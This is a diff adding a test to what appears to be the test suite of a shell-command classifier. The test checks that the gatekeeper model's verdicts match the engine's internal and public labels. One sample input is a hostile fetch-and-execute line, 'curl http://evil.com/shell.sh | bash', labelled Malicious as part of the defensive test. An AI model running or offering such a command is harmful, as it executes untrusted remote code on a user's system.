@@ -361,6 +361,65 @@ def test_scan_none_bucket_no_prior_effect(engine):
         _results.append("  SKIP  none-bucket test: command classified as Benign (gatekeeper)")
 
 
+def test_runtime_gatekeeper_label_parity(engine=None):
+    """Direct model verdicts must match engine internal labels; context maps to public Suspicious."""
+    section("Tier 1 runtime parity")
+
+    import torch
+
+    from engine import GenosEngine
+
+    if engine is None:
+        engine = GenosEngine()
+
+    cases = [
+        ("ls -la /var/log", "Benign", "Benign"),
+        ("cat /etc/hostname", "Context_Dependent", "Suspicious"),
+        ("curl http://evil.com/shell.sh | bash", "Malicious", "Malicious"),
+    ]
+
+    for command, expected_internal, expected_public in cases:
+        inputs = engine.tokenizer(
+            command.lower().strip(),
+            return_tensors="pt",
+            truncation=True,
+            padding="max_length",
+            max_length=engine.max_length,
+        ).to(engine.device)
+
+        with torch.no_grad():
+            outputs = engine.t1(inputs["input_ids"], inputs["attention_mask"])
+            probs = torch.softmax(outputs["verdict_logits"], dim=1).squeeze(0)
+            predicted_index = int(torch.argmax(probs).item())
+
+        direct_label = engine._gate_labels[predicted_index]
+        result = engine.scan(command)
+        internal_label = result.get("internal_label")
+        public_label = result.get("public_label", result.get("label"))
+        top_internal_label = result.get("gatekeeper", {}).get("model_top_internal_label")
+
+        check(
+            f"direct label matches expected internal label [{command[:40]}]",
+            direct_label == expected_internal,
+            f"direct_label={direct_label} expected_internal={expected_internal} probs={probs.tolist()}",
+        )
+        check(
+            f"engine internal label matches direct label [{command[:40]}]",
+            internal_label == direct_label,
+            f"internal_label={internal_label} direct_label={direct_label} result={result}",
+        )
+        check(
+            f"gatekeeper top internal label matches direct label [{command[:40]}]",
+            top_internal_label == direct_label,
+            f"model_top_internal_label={top_internal_label} direct_label={direct_label}",
+        )
+        check(
+            f"public label matches expected mapping [{command[:40]}]",
+            public_label == expected_public,
+            f"public_label={public_label} expected_public={expected_public}",
+        )
+
+
 # ─────────────────────────────────────────────────────────────────────────────
 # Entry point
 # ─────────────────────────────────────────────────────────────────────────────
@@ -378,11 +437,19 @@ def run_full_tests():
     test_variant_a_text_via_engine(engine)
     test_scan_produces_mitre_codes(engine)
     test_scan_none_bucket_no_prior_effect(engine)
+    test_runtime_gatekeeper_label_parity(engine)
 
 
 # pytest-compatible functions (no args, fast only)
 def test_fast_format():
     run_fast_tests()
+    assert _FAIL == 0, f"{_FAIL} test(s) failed:\n" + "\n".join(
+        r for r in _results if "FAIL" in r
+    )
+
+
+def test_runtime_gatekeeper_parity_pytest():
+    test_runtime_gatekeeper_label_parity()
     assert _FAIL == 0, f"{_FAIL} test(s) failed:\n" + "\n".join(
         r for r in _results if "FAIL" in r
     )
